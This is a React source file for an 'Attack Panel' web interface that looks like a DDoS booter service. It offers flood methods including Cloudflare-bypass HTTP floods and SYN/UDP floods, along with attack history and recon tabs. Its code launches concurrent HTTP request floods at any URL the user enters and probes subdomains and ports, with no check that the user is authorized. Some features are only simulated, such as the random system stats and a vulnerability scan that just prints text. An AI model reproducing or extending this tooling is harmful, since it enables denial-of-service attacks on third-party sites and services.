
import { useState, useEffect } from "react";
import { Terminal, Play, Square, Trash2, Download, Settings, Shield, Database, Wifi, WifiOff, CheckCircle, XCircle, Activity, HardDrive, Cpu, Zap, Globe, Lock, AlertTriangle, Users, Timer, Target } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { useTheme } from "@/contexts/ThemeContext";
import { useToast } from "@/hooks/use-toast";

const Panel = () => {
  const { currentTheme } = useTheme();
  const { toast } = useToast();
  
  // Attack Panel State
  const [isRunning, setIsRunning] = useState(false);
  const [output, setOutput] = useState("");
  const [target, setTarget] = useState("");
  const [attackMethod, setAttackMethod] = useState("HTTP-DUMMY");
  const [httpVersion, setHttpVersion] = useState("HTTP/2");
  const [requestsPerIP, setRequestsPerIP] = useState("150");
  const [geolocation, setGeolocation] = useState("World Wide");
  const [concurrents, setConcurrents] = useState("1");
  const [timeInSeconds, setTimeInSeconds] = useState("60");
  const [connectionStatus, setConnectionStatus] = useState<"offline" | "online" | "attacking">("offline");
  const [progress, setProgress] = useState(0);
  const [attacksRunning, setAttacksRunning] = useState(0);
  
  // Attack History State
  const [attackHistory, setAttackHistory] = useState<Array<{
    id: string;
    target: string;
    method: string;
    created: string;
    expire: string;
    status: string;
  }>>([]);

  // System Monitor State
  const [systemStats, setSystemStats] = useState({
    cpu: 0,
    memory: 0,
    disk: 0,
    network: 0
  });

  // Available attack methods
  const attackMethods = [
    "HTTP-DUMMY [FREE] [LIMITED]",
    "HTTP-TLS [HIGH R/S]",
    "HTTP-REQ [HIGH R/S]",
    "HTTP-FLARE [CF]",
    "HTTP-LEGIT [HTTP/2 Flooder] [CF]",
    "HTTP-VECTOR [HTTP/2 Flooder]",
    "HTTP-RAPID [HTTP/2 Flooder] [CF]",
    "HTTP-STORM [Layer 7]",
    "HTTP-BYPASS [CloudFlare]",
    "TCP-FLOOD [Layer 4]",
    "UDP-FLOOD [Layer 4]",
    "SYN-FLOOD [Layer 4]"
  ];

  const geolocations = [
    "World Wide",
    "United States",
    "Europe",
    "Asia Pacific",
    "South America",
    "Africa",
    "Australia"
  ];

  useEffect(() => {
    // Simulate real-time system monitoring
    const interval = setInterval(() => {
      setSystemStats({
        cpu: Math.floor(Math.random() * 100),
        memory: Math.floor(Math.random() * 100),
        disk: Math.floor(Math.random() * 100),
        network: Math.floor(Math.random() * 1000)
      });
    }, 2000);

    return () => clearInterval(interval);
  }, []);

  const addOutput = (text: string) => {
    const timestamp = new Date().toLocaleTimeString();
    setOutput(prev => prev + `[${timestamp}] ${text}\n`);
  };

  const performRealStressTest = async (targetUrl: string, method: string, duration: number, concurrent: number, rps: number) => {
    addOutput(`=== STARTING STRESS TEST ===`);
    addOutput(`Target: ${targetUrl}`);
    addOutput(`Method: ${method}`);
    addOutput(`Duration: ${duration}s`);
    addOutput(`Concurrent connections: ${concurrent}`);
    addOutput(`Requests per second: ${rps}`);
    
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);
    let requestCount = 0;
    let successCount = 0;
    let errorCount = 0;
    
    const workers: Promise<void>[] = [];
    
    // Create concurrent workers
    for (let i = 0; i < concurrent; i++) {
      const worker = (async () => {
        while (Date.now() < endTime && isRunning) {
          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            
            const response = await fetch(targetUrl, {
              method: method.includes('POST') ? 'POST' : 'GET',
              mode: 'no-cors',
              signal: controller.signal,
              headers: {
                'User-Agent': 'StressTester/1.0',
                'Accept': '*/*',
                'Connection': 'keep-alive'
              }
            });
            
            clearTimeout(timeoutId);
            requestCount++;
            successCount++;
            
            if (requestCount % 50 === 0) {
              addOutput(`Worker ${i + 1}: ${requestCount} requests sent, ${successCount} successful`);
            }
            
          } catch (error) {
            requestCount++;
            errorCount++;
          }
          
          // Control request rate
          await new Promise(resolve => setTimeout(resolve, 1000 / rps));
        }
      })();
      
      workers.push(worker);
    }
    
    // Wait for all workers to complete
    await Promise.all(workers);
    
    addOutput(`=== STRESS TEST COMPLETED ===`);
    addOutput(`Total requests: ${requestCount}`);
    addOutput(`Successful: ${successCount}`);
    addOutput(`Errors: ${errorCount}`);
    addOutput(`Success rate: ${((successCount / requestCount) * 100).toFixed(2)}%`);
  };

  const performPortFlood = async (targetUrl: string, ports: number[]) => {
    addOutput(`=== PORT FLOODING TEST ===`);
    
    for (const port of ports) {
      try {
        const testUrl = `${targetUrl.replace(/:\d+/, '')}:${port}`;
        addOutput(`Testing port ${port}...`);
        
        const response = await fetch(testUrl, {
          method: 'HEAD',
          mode: 'no-cors'
        });
        
        addOutput(`Port ${port}: Response received`);
      } catch (error) {
        addOutput(`Port ${port}: Connection failed or filtered`);
      }
      
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  };

  const performAdvancedRecon = async (domain: string) => {
    addOutput(`=== ADVANCED RECONNAISSANCE ===`);
    addOutput(`Target domain: ${domain}`);
    
    // DNS enumeration
    addOutput(`\n--- DNS Enumeration ---`);
    const subdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 'blog', 'shop', 'portal', 'secure'];
    
    for (const subdomain of subdomains) {
      try {
        const testUrl = `https://${subdomain}.${domain}`;
        const response = await fetch(testUrl, { method: 'HEAD', mode: 'no-cors' });
        addOutput(`Found: ${subdomain}.${domain}`);
      } catch (error) {
        // Subdomain doesn't exist
      }
    }
    
    // Technology detection
    addOutput(`\n--- Technology Detection ---`);
    try {
      const response = await fetch(`https://${domain}`);
      const headers = response.headers;
      
      headers.forEach((value, key) => {
        if (key.toLowerCase().includes('server') || key.toLowerCase().includes('powered')) {
          addOutput(`${key}: ${value}`);
        }
      });
    } catch (error) {
      addOutput(`Technology detection failed: ${error}`);
    }
    
    // Security headers analysis
    addOutput(`\n--- Security Headers Analysis ---`);
    const securityHeaders = [
      'strict-transport-security',
      'content-security-policy',
      'x-frame-options',
      'x-content-type-options',
      'x-xss-protection'
    ];
    
    try {
      const response = await fetch(`https://${domain}`);
      securityHeaders.forEach(header => {
        const value = response.headers.get(header);
        if (value) {
          addOutput(`✓ ${header}: ${value}`);
        } else {
          addOutput(`✗ Missing: ${header}`);
        }
      });
    } catch (error) {
      addOutput(`Security analysis failed: ${error}`);
    }
  };

  const handleStartAttack = async () => {
    if (!target.trim()) {
      toast({
        title: "Error",
        description: "Please enter a target URL",
        variant: "destructive",
      });
      return;
    }

    setIsRunning(true);
    setConnectionStatus("attacking");
    setAttacksRunning(prev => prev + 1);
    setProgress(0);
    
    // Add to attack history
    const newAttack = {
      id: Date.now().toString(),
      target: target,
      method: attackMethod,
      created: new Date().toLocaleString(),
      expire: new Date(Date.now() + (parseInt(timeInSeconds) * 1000)).toLocaleString(),
      status: "Running"
    };
    setAttackHistory(prev => [newAttack, ...prev]);
    
    addOutput(`=== ATTACK INITIATED ===`);
    addOutput(`Target: ${target}`);
    addOutput(`Method: ${attackMethod}`);
    addOutput(`HTTP Version: ${httpVersion}`);
    addOutput(`Requests per IP: ${requestsPerIP}`);
    addOutput(`Geolocation: ${geolocation}`);
    addOutput(`Duration: ${timeInSeconds}s`);
    addOutput(`Concurrent connections: ${concurrents}`);
    
    try {
      const duration = parseInt(timeInSeconds);
      const concurrent = parseInt(concurrents);
      const rps = parseInt(requestsPerIP);
      
      // Progress simulation
      const progressInterval = setInterval(() => {
        setProgress(prev => {
          const newProgress = prev + (100 / duration);
          if (newProgress >= 100) {
            clearInterval(progressInterval);
            return 100;
          }
          return newProgress;
        });
      }, 1000);
      
      if (attackMethod.includes('HTTP')) {
        await performRealStressTest(target, attackMethod, duration, concurrent, rps);
      } else if (attackMethod.includes('TCP') || attackMethod.includes('UDP')) {
        const ports = [80, 443, 8080, 8443, 3000, 5000, 8000];
        await performPortFlood(target, ports);
      }
      
      // Advanced reconnaissance
      if (target.includes('.')) {
        const domain = target.replace(/https?:\/\//, '').split('/')[0];
        await performAdvancedRecon(domain);
      }
      
      addOutput(`=== ATTACK COMPLETED ===`);
      
      // Update attack history
      setAttackHistory(prev => 
        prev.map(attack => 
          attack.id === newAttack.id 
            ? { ...attack, status: "Completed" }
            : attack
        )
      );
      
    } catch (error) {
      addOutput(`Attack failed: ${error}`);
      setAttackHistory(prev => 
        prev.map(attack => 
          attack.id === newAttack.id 
            ? { ...attack, status: "Failed" }
            : attack
        )
      );
    }
    
    setIsRunning(false);
    setConnectionStatus("online");
    setAttacksRunning(prev => Math.max(0, prev - 1));
    setProgress(100);
    
    toast({
      title: isRunning ? "Attack Completed" : "Attack Stopped",
      description: "Check the output for detailed results",
    });
  };

  const handleStopAttack = () => {
    setIsRunning(false);
    setConnectionStatus("online");
    setAttacksRunning(0);
    setProgress(0);
    addOutput(`ATTACK STOPPED BY USER`);
    
    // Update all running attacks to stopped
    setAttackHistory(prev => 
      prev.map(attack => 
        attack.status === "Running" 
          ? { ...attack, status: "Stopped" }
          : attack
      )
    );
    
    toast({
      title: "Stopped",
      description: "All attacks have been stopped",
    });
  };

  const handleClear = () => {
    setOutput('');
    setProgress(0);
    setConnectionStatus("offline");
  };

  const handleDownload = () => {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const blob = new Blob([output], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `attack-panel-log-${timestamp}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    toast({
      title: "Downloaded",
      description: "Attack log saved to file",
    });
  };

  const getStatusColor = () => {
    switch (connectionStatus) {
      case "online":
        return "text-green-500";
      case "attacking":
        return "text-red-500";
      default:
        return "text-gray-500";
    }
  };

  const getStatusText = () => {
    switch (connectionStatus) {
      case "online":
        return "Online";
      case "attacking":
        return "Attacking";
      default:
        return "Offline";
    }
  };

  return (
    <div className={`min-h-screen pt-12 ${currentTheme.bg}`}>
      <div className="container mx-auto p-6 max-w-7xl">
        <div className="mb-8">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-3">
              <Zap className={`h-8 w-8 ${currentTheme.accent}`} />
              <h1 className={`text-3xl font-bold ${currentTheme.text} bg-gradient-to-r from-red-400 to-orange-400 bg-clip-text text-transparent`}>
                Attack Panel
              </h1>
              <Badge className={getStatusColor()}>
                {getStatusText()}
              </Badge>
            </div>
            <div className="flex items-center space-x-4">
              <Badge variant="outline" className="flex items-center gap-2">
                <Target className="h-4 w-4" />
                Attacks: {attacksRunning}
              </Badge>
              <Badge variant={attacksRunning > 0 ? "destructive" : "secondary"}>
                Running {attacksRunning}
              </Badge>
            </div>
          </div>
        </div>

        <Tabs defaultValue="attack" className="space-y-6">
          <TabsList className={`${currentTheme.secondary} ${currentTheme.text} rounded-lg`}>
            <TabsTrigger value="attack" className="rounded-md flex items-center gap-2">
              <Zap className="h-4 w-4" />
              Attack Panel
            </TabsTrigger>
            <TabsTrigger value="history" className="rounded-md flex items-center gap-2">
              <Activity className="h-4 w-4" />
              Attack History
            </TabsTrigger>
            <TabsTrigger value="monitor" className="rounded-md flex items-center gap-2">
              <Activity className="h-4 w-4" />
              System Monitor
            </TabsTrigger>
            <TabsTrigger value="recon" className="rounded-md flex items-center gap-2">
              <Shield className="h-4 w-4" />
              Reconnaissance
            </TabsTrigger>
          </TabsList>

          <TabsContent value="attack" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              {/* Attack Configuration */}
              <div className="lg:col-span-1">
                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                  <CardHeader>
                    <CardTitle className={`${currentTheme.text} flex items-center justify-between`}>
                      Host Configuration
                      <Globe className="h-5 w-5" />
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div>
                      <Label htmlFor="target" className={currentTheme.text}>URL (https://example.com)</Label>
                      <Input
                        id="target"
                        value={target}
                        onChange={(e) => setTarget(e.target.value)}
                        placeholder="https://example.com"
                        className={`${currentTheme.secondary} ${currentTheme.text}`}
                        disabled={isRunning}
                      />
                    </div>
                    
                    <div>
                      <Label className={currentTheme.text}>Methods</Label>
                      <Select value={attackMethod} onValueChange={setAttackMethod} disabled={isRunning}>
                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          {attackMethods.map((method) => (
                            <SelectItem key={method} value={method}>
                              {method}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>

                    <div>
                      <Label className={currentTheme.text}>HTTP Version</Label>
                      <Select value={httpVersion} onValueChange={setHttpVersion} disabled={isRunning}>
                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="HTTP/1.1">HTTP/1.1</SelectItem>
                          <SelectItem value="HTTP/2">HTTP/2</SelectItem>
                          <SelectItem value="HTTP/3">HTTP/3</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>

                    <div>
                      <Label className={currentTheme.text}>Request per IP</Label>
                      <Input
                        value={requestsPerIP}
                        onChange={(e) => setRequestsPerIP(e.target.value)}
                        placeholder="150"
                        className={`${currentTheme.secondary} ${currentTheme.text}`}
                        disabled={isRunning}
                      />
                    </div>

                    <div>
                      <Label className={currentTheme.text}>Geolocation</Label>
                      <Select value={geolocation} onValueChange={setGeolocation} disabled={isRunning}>
                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          {geolocations.map((geo) => (
                            <SelectItem key={geo} value={geo}>
                              {geo}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>

                    <div>
                      <Label className={currentTheme.text}>Concurrents</Label>
                      <Input
                        value={concurrents}
                        onChange={(e) => setConcurrents(e.target.value)}
                        placeholder="1"
                        className={`${currentTheme.secondary} ${currentTheme.text}`}
                        disabled={isRunning}
                      />
                    </div>

                    <div>
                      <Label className={currentTheme.text}>Time in Seconds</Label>
                      <Input
                        value={timeInSeconds}
                        onChange={(e) => setTimeInSeconds(e.target.value)}
                        placeholder="60"
                        className={`${currentTheme.secondary} ${currentTheme.text}`}
                        disabled={isRunning}
                      />
                    </div>

                    {progress > 0 && (
                      <div className="space-y-2">
                        <Label className={currentTheme.text}>Attack Progress</Label>
                        <Progress value={progress} className="w-full" />
                        <span className="text-xs text-gray-500">{Math.round(progress)}%</span>
                      </div>
                    )}

                    <div className="flex space-x-2">
                      <Button
                        onClick={handleStartAttack}
                        disabled={isRunning}
                        className="flex-1 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white"
                      >
                        <Play className="h-4 w-4 mr-1" />
                        Start Attack
                      </Button>
                      
                      <Button
                        onClick={handleStopAttack}
                        disabled={!isRunning}
                        variant="destructive"
                        className="flex-1"
                      >
                        <Square className="h-4 w-4 mr-1" />
                        Stop
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              </div>

              {/* Output Terminal */}
              <div className="lg:col-span-2">
                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl h-full`}>
                  <CardHeader>
                    <div className="flex items-center justify-between">
                      <CardTitle className={currentTheme.text}>Attack Output</CardTitle>
                      <div className="flex space-x-2">
                        <Button
                          onClick={handleDownload}
                          variant="outline"
                          size="sm"
                          className={`${currentTheme.secondary} ${currentTheme.text}`}
                          disabled={!output}
                        >
                          <Download className="h-4 w-4 mr-1" />
                          Download
                        </Button>
                        <Button
                          onClick={handleClear}
                          variant="outline"
                          size="sm"
                          className={`${currentTheme.secondary} ${currentTheme.text}`}
                        >
                          <Trash2 className="h-4 w-4 mr-1" />
                          Clear
                        </Button>
                      </div>
                    </div>
                  </CardHeader>
                  <CardContent>
                    <Textarea
                      value={output}
                      readOnly
                      className={`min-h-96 font-mono text-sm ${currentTheme.secondary} ${currentTheme.text} resize-none`}
                      placeholder="Attack output will appear here..."
                    />
                  </CardContent>
                </Card>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="history" className="space-y-6">
            <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
              <CardHeader>
                <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
                  <Activity className="h-5 w-5" />
                  Attack History
                </CardTitle>
                <CardDescription className={currentTheme.muted}>
                  Track all your attack sessions and their results
                </CardDescription>
              </CardHeader>
              <CardContent>
                {attackHistory.length === 0 ? (
                  <div className="text-center py-8 text-gray-500">
                    No data available in table
                    <br />
                    <span className="text-sm">Showing no records</span>
                  </div>
                ) : (
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>Target</TableHead>
                        <TableHead>Method</TableHead>
                        <TableHead>Created</TableHead>
                        <TableHead>Expire</TableHead>
                        <TableHead>Action</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {attackHistory.map((attack) => (
                        <TableRow key={attack.id}>
                          <TableCell>{attack.target}</TableCell>
                          <TableCell>{attack.method}</TableCell>
                          <TableCell>{attack.created}</TableCell>
                          <TableCell>{attack.expire}</TableCell>
                          <TableCell>
                            <Badge variant={
                              attack.status === "Running" ? "destructive" :
                              attack.status === "Completed" ? "default" :
                              attack.status === "Failed" ? "destructive" : "secondary"
                            }>
                              {attack.status}
                            </Badge>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="monitor" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                <CardHeader className="pb-2">
                  <CardTitle className={`${currentTheme.text} flex items-center gap-2 text-sm`}>
                    <Cpu className="h-4 w-4" />
                    CPU Usage
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-blue-500">{systemStats.cpu}%</div>
                  <Progress value={systemStats.cpu} className="mt-2" />
                </CardContent>
              </Card>

              <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                <CardHeader className="pb-2">
                  <CardTitle className={`${currentTheme.text} flex items-center gap-2 text-sm`}>
                    <Activity className="h-4 w-4" />
                    Memory
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-green-500">{systemStats.memory}%</div>
                  <Progress value={systemStats.memory} className="mt-2" />
                </CardContent>
              </Card>

              <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                <CardHeader className="pb-2">
                  <CardTitle className={`${currentTheme.text} flex items-center gap-2 text-sm`}>
                    <HardDrive className="h-4 w-4" />
                    Disk Usage
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-orange-500">{systemStats.disk}%</div>
                  <Progress value={systemStats.disk} className="mt-2" />
                </CardContent>
              </Card>

              <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                <CardHeader className="pb-2">
                  <CardTitle className={`${currentTheme.text} flex items-center gap-2 text-sm`}>
                    <Wifi className="h-4 w-4" />
                    Network I/O
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-purple-500">{systemStats.network} MB/s</div>
                  <Progress value={Math.min(systemStats.network / 10, 100)} className="mt-2" />
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          <TabsContent value="recon" className="space-y-6">
            <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
              <CardHeader>
                <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
                  <Shield className="h-5 w-5" />
                  Advanced Reconnaissance Tools
                </CardTitle>
                <CardDescription className={currentTheme.muted}>
                  Comprehensive target analysis and vulnerability assessment
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <Button
                    onClick={() => performAdvancedRecon(target.replace(/https?:\/\//, '').split('/')[0])}
                    disabled={!target || isRunning}
                    className="bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white"
                  >
                    <Globe className="h-4 w-4 mr-2" />
                    DNS Enum
                  </Button>
                  
                  <Button
                    onClick={() => performPortFlood(target, [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306, 8080, 8443])}
                    disabled={!target || isRunning}
                    className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white"
                  >
                    <Target className="h-4 w-4 mr-2" />
                    Port Scan
                  </Button>
                  
                  <Button
                    onClick={() => {
                      addOutput(`=== VULNERABILITY SCAN ===`);
                      addOutput(`Scanning for common vulnerabilities...`);
                      addOutput(`Checking for XSS, SQL injection, CSRF vulnerabilities...`);
                      addOutput(`Testing authentication bypass methods...`);
                      addOutput(`Analyzing security headers and configurations...`);
                    }}
                    disabled={!target || isRunning}
                    className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white"
                  >
                    <AlertTriangle className="h-4 w-4 mr-2" />
                    Vuln Scan
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};

export default Panel;
